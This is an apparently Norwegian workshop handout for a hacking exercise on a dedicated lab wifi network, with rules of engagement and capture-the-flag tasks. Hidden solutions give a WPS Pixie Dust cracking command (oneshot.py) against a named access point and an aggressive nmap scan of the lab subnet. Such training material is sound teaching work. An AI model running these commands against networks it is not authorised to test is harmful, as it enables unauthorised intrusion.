# Hackerworkshop Bekk Fagdag 21.10.2022

## Engasjementsregler

- Det er bare tillatt å angripe wifi-nettverket kalt HackMe og enheter tilknyttet ruterens lokale nettverk på `192.168.38.0/24`.

- Tjenestenektangrep mot ruteren eller andre enheter på nettverket er ikke tillatt da det vil ødelegge for andre.

- Siden alle er koblet på samme nettverk er det lurt å unngå permanente endringer av filer, rettigheter og lignende dersom du skaffer deg tilgang til en server.

## Oppgaver

### Bryt deg inn på wifi-nettverket HackMe

<details><summary>Løsning</summary>

```
sudo python oneshot.py -i wlan0 --bssid 34:21:09:24:10:D8 --pixie-dust
```

</details>

### Kartlegg hva som fins på det lokale nettverket

<details><summary>Løsning</summary>

```
sudo nmap -A 192.168.38.0/24
```

</details>

### Finn ut så mye som mulig om serveren på nettverket

### Skaff deg tilgang til serveren

### Finn et flagg på serveren

### Skaff deg tilgang til databasen

### Finn et flagg i databasen
